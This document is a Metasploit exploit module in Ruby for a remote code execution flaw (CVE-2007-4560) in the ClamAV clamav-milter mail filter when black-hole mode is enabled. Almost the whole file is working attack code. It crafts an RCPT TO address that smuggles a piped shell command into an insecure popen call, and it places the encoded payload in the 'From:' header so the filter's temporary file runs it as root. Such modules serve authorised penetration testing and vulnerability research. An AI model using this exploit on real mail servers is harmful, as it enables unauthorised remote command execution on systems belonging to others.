##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Smtp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ClamAV Milter Blackhole-Mode Remote Code Execution',
			'Description'    => %q{
					This module exploits a flaw in the Clam AntiVirus suite 'clamav-milter'
					(Sendmail mail filter). Versions prior to v0.92.2 are vulnerable.
					When implemented with black hole mode enabled, it is possible to execute
					commands remotely due to an insecure popen call.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', '2007-4560' ],
					[ 'OSVDB', '36909' ],
					[ 'BID', '25439' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/4761' ],
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},		
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        => 
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Aug 24 2007',
			'DefaultTarget'  => 0))

			register_options(
			[
				OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'nobody@localhost']),
			], self.class)
	end

	def exploit

		# ClamAV writes randomized msg.###### temporary files in a randomized
		# /tmp/clamav-#######################/ directory. This directory is
		# the clamav-milter process working directory.
		#
		# We *can* execute arbitrary code directly from 'sploit', however the
		# SMTP RFC rejects all payloads with the exception of generic CMD
		# payloads due to the IO redirects. I discovered that the 'From:'
		# header is written to this temporary file prior to the vulnerable
		# call, so we call the file itself and payload.encoded is executed.

		sploit = "sh msg*" # Execute the clamav-milter temporary file.

		# Create the malicious RCPT TO before connecting,
		# to make good use of the Exploit::Smtp support.

		oldaddr = datastore['MAILTO']
		newaddr = oldaddr.split('@')

		datastore['MAILTO'] = "<#{newaddr[0]}+\"|#{sploit}\"@#{newaddr[1]}>"

		connect_login

		sock.put("From: ;#{payload.encoded}\r\n") # We are able to stick our payload in this header
		sock.put(".\r\n")

		# Clean up RCPT TO afterwards

		datastore['MAILTO'] = oldaddr

		handler
		disconnect
	end

end
